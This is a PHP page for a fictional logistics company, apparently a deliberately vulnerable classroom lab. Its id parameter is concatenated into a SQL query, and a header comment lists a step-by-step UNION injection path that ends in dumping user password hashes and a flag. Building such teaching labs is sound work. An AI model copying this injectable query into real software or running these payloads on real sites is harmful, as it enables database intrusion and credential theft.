<?php
require 'db.php';
$page_title = "Service Catalog · Q8 Logistics";

// =====================================================================
// PRIMARY CLASSWORK TARGET
// `id` parameter is concatenated directly into the query.
// 3 columns are returned (name, price, category) — students need to
// match this column count with their UNION SELECT.
//
// Attack path:
//   ?id=5                                                 → normal
//   ?id=5'                                                → SQL error (confirms injection)
//   ?id=5 ORDER BY 1     ... ORDER BY 4                   → finds column count = 3
//   ?id=5 UNION SELECT NULL,NULL,NULL                     → confirms 3 cols
//   ?id=-1 UNION SELECT table_name,NULL,NULL FROM
//          information_schema.tables WHERE
//          table_schema=database()                        → enumerate tables
//   ?id=-1 UNION SELECT username,password,role FROM users → extract Ahmed's hash
//   ?id=-1 UNION SELECT config_key,config_value,NULL
//          FROM settings                                  → find the flag
// =====================================================================

$detail_view = isset($_GET['id']);
$product = null;
$error = null;

if ($detail_view) {
    $id = $_GET['id'];  // NOT escaped — vulnerable
    $query = "SELECT name, price, category FROM products WHERE id=$id";
    $result = mysqli_query($conn, $query);

    if ($result === false) {
        $error = mysqli_error($conn);
    } else {
        // Show ALL rows (so UNION-based extractions display both rows)
        $rows = [];
        while ($r = mysqli_fetch_assoc($result)) {
            $rows[] = $r;
        }
    }
} else {
    // Default listing — show all products (no SQLi here)
    $query = "SELECT id, name, price, category FROM products ORDER BY id";
    $result = mysqli_query($conn, $query);
    $all_rows = [];
    while ($r = mysqli_fetch_assoc($result)) {
        $all_rows[] = $r;
    }
}

include '_header.php';
?>

<div class="card">
  <h1>Service Catalog</h1>
  <p>Q8 Logistics offers domestic and cross-border logistics solutions across the GCC.<br>
     Click any service for details.</p>

  <?php if ($detail_view): ?>
    <p style="margin-top:14px"><a href="/products.php" style="color:#0d2949;font-weight:600;text-decoration:none">← Back to all services</a></p>
  <?php endif; ?>
</div>

<?php if ($detail_view): ?>
  <div class="card">
    <h2>Service detail (id = <?= htmlspecialchars($_GET['id']) ?>)</h2>

    <?php if ($error): ?>
      <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php elseif (empty($rows)): ?>
      <p>No service found with that id.</p>
    <?php else: ?>
      <table>
        <thead>
          <tr><th>Name</th><th>Price (KWD)</th><th>Category</th></tr>
        </thead>
        <tbody>
          <?php foreach ($rows as $row): ?>
            <tr>
              <td><?= htmlspecialchars($row['name'] ?? '') ?></td>
              <td class="price"><?= htmlspecialchars($row['price'] ?? '') ?></td>
              <td><span class="badge"><?= htmlspecialchars($row['category'] ?? '') ?></span></td>
            </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
    <?php endif; ?>
  </div>
<?php else: ?>
  <div class="card">
    <table>
      <thead>
        <tr><th>ID</th><th>Service</th><th>Price (KWD)</th><th>Category</th><th></th></tr>
      </thead>
      <tbody>
        <?php foreach ($all_rows as $row): ?>
          <tr>
            <td>#<?= $row['id'] ?></td>
            <td><?= htmlspecialchars($row['name']) ?></td>
            <td class="price"><?= number_format($row['price'], 2) ?></td>
            <td><span class="badge"><?= htmlspecialchars($row['category']) ?></span></td>
            <td><a href="/products.php?id=<?= $row['id'] ?>" style="color:#0d2949;font-weight:600;text-decoration:none">View →</a></td>
          </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
<?php endif; ?>

<?php include '_footer.php'; ?>
